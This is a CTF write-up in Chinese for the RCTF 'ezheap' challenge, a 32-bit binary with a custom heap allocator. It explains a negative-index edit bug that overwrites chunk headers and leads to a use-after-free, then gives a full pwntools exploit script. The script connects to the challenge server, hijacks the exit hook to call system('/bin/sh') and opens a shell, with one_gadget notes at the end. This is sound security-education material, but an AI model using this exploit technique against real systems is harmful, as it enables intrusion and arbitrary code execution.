# Rctf ezheap

32位保护全开，自己实现了个堆管理器。

malloc逻辑就是对于小于4096的chunk用一块大的内存搞，大于的话就直接mmap一块，arena里面有相应的一些数据结构管理。

在申请小于maxsize的chunk时，会在bigmem中用随机数找一个地址，如果随机数的地址被占用了，那么再随机一次，随机三次都没找到的话就重新mmap一块bigmem，各个bigmem用fdbk链接成双向链表。chunk的头部是4字节，数值为chunk加上头部大小后的真正大小｜当前chunk属于的bigmem的地址，也就是说低12位为size，高20位为所属的bigmem地址。

free的逻辑大体是每个bigmem都有个类似于fastbin的单链表，free的时候就放进这个单链表头部，然后最大数量是16个。

漏洞点在于edit函数：

![edit](https://s3cunDa.github.io/assets/post/edit.png)

index可以为-1，可以直接修改堆头。

free掉之后再次申请到就可以泄漏fd，也就是mmap的堆的地址，但是这个地址是个随机的，不过问题不大。

有了堆地址后就可以伪造堆头。

在add的时候没有检查堆块的合法性，所以只要有UAF就能有任意内存地址读写

现在就是看看能不能利用这个堆头做什么文章了。

在free的时候有一个检查

![delete](https://s3cunDa.github.io/assets/post/delete.png)

也就是检查一下要free的chunk的size是否和管理他的bigmem的size一样。

由于free一个chunk的时候，程序是根据header来找bigmem的，所以可以通过修改堆头部，修改bigmem，修改的bigmem的realsize要和头部那个size一样。

通过这个修改头部的方式将一个chunk释放到两个bigmem中，具体来说，就是把一个小的chunk释放到大的结构体中，这时候edit他，就有UAF了。

最后攻击的地方是exithook，在__call_tls_dtors函数往后的位置会有一个间接跳转，跳转地址是exithook，参数是exithook之前一段区域，劫持即可。

exp：

```python
from pwn import *
import sys
#context(log_level='debug',os='linux',arch='i386')
myelf = ELF("./ezheap")

#io = remote('chall.pwnable.tw', 10303)
libc = ELF('./libc-2.27.so')
ld = ELF('./ld-2.27.so')
local = False
load_lib = True
if not local:
	io = remote('123.60.25.24', 20077)
elif load_lib :
	io = process(argv=[ld.path,myelf.path],env={"LD_PRELOAD":'./libc-2.27.so'})
	#gdb_text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
	#gdb_libc_base = int(os.popen("pmap {}| grep libc | awk '{{print $1}}'".format(io.pid)).readlines()[0], 16)
	
else:
	io = process(argv=[myelf.path])#,env={"LD_PRELOAD":'./libc_64.so.6'})
	#gdb_text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
	#gdb_libc_base = int(os.popen("pmap {}| grep libc | awk '{{print $1}}'".format(io.pid)).readlines()[0], 16)
# debug function

def p():
	gdb.attach(io)
	raw_input()
def choice(c):
    io.recvuntil('choice>>')
    io.sendline(str(c))
def sett(t):
    io.recvuntil('type >>')
    io.sendline(str(t))
def add(t,size,idx):
    choice(1)
    sett(t)
    io.recvuntil('size>>')
    io.sendline(str(size))
    io.recvuntil('idx>>')
    io.sendline(str(idx))
def delete(t,idx):
    choice(4)
    sett(t)
    io.recvuntil('idx>>')
    io.sendline(str(idx))
def show(t,idx,eidx):
    choice(3)
    sett(t)
    io.recvuntil('idx>>')
    io.sendline(str(idx))
    io.recvuntil('element_idx>>')
    io.sendline(str(eidx))
def edit(t,idx,eidx,content):
    choice(2)
    sett(t)
    io.recvuntil('idx>>')
    io.sendline(str(idx))
    io.recvuntil('element_idx>>')
    io.sendline(str(eidx))
    io.recvuntil('value>>')
    io.sendline(str(content))
def exp():
    add(3,0xf00,0)
    add(3,0xf00,1)
    add(3,0xf00,2)
    add(3,0xf00,3)
    delete(3,1)
    delete(3,0)
    delete(3,2)
    add(3,0xf00,0)
    add(3,0xf00,1)
    add(3,0xf00,2)
    show(3,0,0)
    #edit(3,0,-1,0xdeadbeef)
    io.recvuntil('value>>\n')
    leak = int(io.recvline(keepends= False).decode())
    # target ld_base + _rtld_global + 2100 / 2104
    while(leak % 0x1000):
        leak -= 0xf04
    log.success(hex(leak))
    origin_big_mem = leak
    another_big_mem = leak - 0x6000
    log.success(hex(another_big_mem))

    libc_base = leak + 0x5000
    exit_hook = libc_base + 0x619060 + 3840

    delete(3,1)
    delete(3,2)
    delete(3,3)

    add(1,0xff0,0)
    add(1,0xff0,1)
    add(1,0xff0,2)
    fake_head = another_big_mem | 0xff4
    edit(3,0,-1,fake_head)
    delete(3,0)
    
    add(1,0xff0,3)
    target = libc_base + 0x213040 + 1220 -4

    tmp = target & 0x000000ff
    edit(1,3,0xf00,tmp)

    target = target >> 8
    tmp = target & 0xff
    edit(1,3,0xf01,tmp)

    target = target >> 8
    tmp = target & 0xff
    edit(1,3,0xf02,tmp)

    target = target >> 8
    tmp = target & 0xff
    edit(1,3,0xf03,tmp)

    target = libc_base + 0x213040 + 1220 - 4
    tmp = target & 0xff
    edit(1,3,0xf04,tmp)

    target = target >> 8
    tmp = target & 0xff
    edit(1,3,0xf05,tmp)

    target = target >> 8
    tmp = target & 0xff
    edit(1,3,0xf06,tmp)
    target = target >> 8
    tmp = target & 0xff
    edit(1,3,0xf07,tmp)
    
 
    add(3,0xf00,1)
    add(3,0xf00,2)
    add(3,0xf00,3)
    edit(3,3,0,0x6e69622f)
    edit(3,3,1,0x0068732f)
    edit(3,3,204,libc_base + libc.symbols['system'])
    edit(3,3,205,libc_base + libc.symbols['system'])
    #0xf7ffd834
    # tls call 0xf7fe59eb
    # func addr = 0x40 + 0xf7ffd040 + 0x7f4
    # binsh addr 0xf7ffd504
    
    edit(3,1,-1,another_big_mem | 0x110)

    delete(3,1)
    #gdb.attach(io,'b exit')
    io.interactive()
# 0xf7fce060 arena in bss
# 0xf7fcd040 random array
# 0xf7fca040 bytearray in bss
# 0xf7fcb040 wordarray in bss
# leak = 0xf7de5000
# another bigmem: 0xf7ddf000
# first bigmem manager 0xf7de9000
'''
0x3ccea execve("/bin/sh", esp+0x34, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x34] == NULL

0x3ccec execve("/bin/sh", esp+0x38, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x38] == NULL




'''
while(1):
    io = remote('123.60.25.24', 20077)
    try:
        exp()
    except:
        io.close()
        continue
```

